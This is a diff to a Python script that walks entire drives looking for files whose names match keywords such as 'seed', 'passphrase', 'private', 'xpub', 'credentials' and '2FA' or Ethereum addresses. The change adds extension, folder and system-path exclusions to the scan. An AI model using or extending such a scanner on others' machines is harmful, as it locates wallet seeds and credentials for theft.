@@ -51,7 +51,9 @@ KEYWORDS_ICONS = {
     "passphrase": "✏️", "xpub": "📜", "0x": "📬", "backup": "📂", "seed": "🌱",
     "private": "🕶️", "account": "🧾", "credentials": "📋", "2FA": "🔑"
 }
-IGNORED_EXTENSIONS = [".exe", ".dll", ".sys", ".tmp", ".log", ".ini", ".dat"]
+IGNORED_EXTENSIONS = [".exe", ".dll", ".sys", ".tmp", ".log", ".ini", ".dat", ".js", ".ts", ".png", ".jpg", ".jpeg", ".gif", ".svg"]
+EXCLUDED_FOLDERS = ["images", "icons", "img16_16", "img24_24", "img32_32", "sketches"]
+EXCLUDED_PATHS = ["C:\\Windows", "Program Files", "AppData", "Local", "Cache"]
 
 # Validate Ethereum addresses
 def is_valid_ethereum_address(file_name):
@@ -109,6 +111,9 @@ def search_files(drive):
     found_items = []
     print(f"🔍 Searching drive {drive}...", flush=True)
     for root, dirs, files in os.walk(drive):
+        # Exclude unwanted paths and folders
+        if any(excluded in root for excluded in EXCLUDED_PATHS + EXCLUDED_FOLDERS):
+            continue
         for file in files:
             file_path = os.path.join(root, file)
             file_name = os.path.basename(file)
